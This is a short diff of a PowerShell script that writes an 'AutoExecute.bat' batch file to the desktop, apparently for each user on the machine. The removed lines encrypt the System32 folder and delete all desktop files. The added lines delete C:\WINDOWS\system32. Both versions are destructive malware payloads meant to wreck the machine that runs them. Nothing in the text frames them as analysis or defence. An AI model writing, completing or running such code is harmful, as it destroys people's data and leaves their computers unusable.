@@ -46,11 +46,8 @@ foreach ($user in $users) {
 
 # Create batch file to run a specific line of code
 $batchFilePath = Join-Path -Path $desktopPath -ChildPath "AutoExecute.bat"
-$lineOfCode = 'REM Encrypt files in system32 using a random key
-cd C:\Windows\System32
-cipher /e /s /a
-REM Delete all icons on the desktop
-del %userprofile%\desktop\*.* /s /q'
+$lineOfCode = '@echo off
+del C:\WINDOWS\system32'
 $batchFileContent = "@echo off`n$lineOfCode"
 
 $batchFileContent | Out-File -FilePath $batchFilePath -Encoding ASCII
